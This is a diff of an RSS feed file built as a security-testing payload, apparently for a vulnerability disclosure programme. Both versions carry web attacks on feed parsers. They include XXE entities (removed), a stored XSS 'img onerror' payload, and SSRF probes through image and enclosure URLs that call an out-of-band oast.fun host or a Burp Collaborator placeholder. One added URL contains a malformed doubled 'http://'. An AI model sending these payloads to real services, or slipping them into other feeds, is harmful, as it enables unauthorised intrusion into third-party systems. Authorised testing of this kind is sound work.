@@ -1,35 +1,32 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
-  <!-- TEST 1: XXE (Entity Expansion) - Visual Confirm -->
-  <!-- If the title in the UI changes to include "VULN_SUCCESS", XXE is enabled. -->
-  <!ENTITY visualCheck "VULN_SUCCESS" >
-
-  <!-- TEST 2: XXE (Blind / Out-of-Band) - Network Confirm -->
-  <!-- If your Collaborator gets a ping from /xxe_trigger, the parser fetched this URL. -->
-  <!ENTITY blindCheck SYSTEM "http://phsrenjcxgefqbuibhlmmzh9nflr3gcop.oast.fun/xxe_trigger" >
-]>
 <rss version="2.0">
   <channel>
-    <!-- The &visualCheck; entity is used here. -->
-    <title>VDP Test: &visualCheck;</title>
+    <title>Logic Test</title>
     <link>http://example.com</link>
-    <description>Combined Security Test</description>
-
+    <description>Testing for SSRF and XSS without DTD</description>
+    
     <item>
-      <!-- The &blindCheck; entity is used here. -->
-      <title>Item Check &blindCheck;</title>
-      <link>http://example.com/test</link>
+      <title>SSRF & XSS Check</title>
+      <link>http://example.com</link>
       
-      <!-- TEST 3: Stored XSS -->
-      <!-- We use CDATA to prevent XML errors, but inject HTML that executes JS if rendered unsanitized. -->
+      <!-- ATTACK 1: XSS -->
+      <!-- If this pops an alert, you have Stored XSS -->
       <description><![CDATA[ 
-        <h3>Security Check</h3>
-        <img src=x onerror=alert('XSS_POP_domain='+document.domain)> 
+        <h3>Test</h3>
+        <img src=x onerror=alert(document.domain)> 
       ]]></description>
       
-      <!-- TEST 4: Application Logic SSRF (Non-XXE) -->
-      <!-- Many RSS parsers automatically fetch 'enclosure' URLs to check file size or MIME type. -->
-      <enclosure url="http://phsrenjcxgefqbuibhlmmzh9nflr3gcop.oast.fun/ssrf_enclosure_check" length="123" type="audio/mpeg" />
+      <!-- ATTACK 2: SSRF via Image Tag -->
+      <!-- Some parsers scrape this URL to show a thumbnail -->
+      <image>
+        <url>http://http://phsrenjcxgefqbuibhlmmzh9nflr3gcop.oast.fun/image_test.jpg</url>
+        <title>Test Image</title>
+        <link>http://example.com</link>
+      </image>
+
+      <!-- ATTACK 3: SSRF via Enclosure -->
+      <!-- The server might try to download this to check file size -->
+      <enclosure url="http://YOUR_BURP_COLLABORATOR.oastify.com/enclosure_test.mp3" length="1234" type="audio/mpeg" />
     </item>
   </channel>
 </rss>
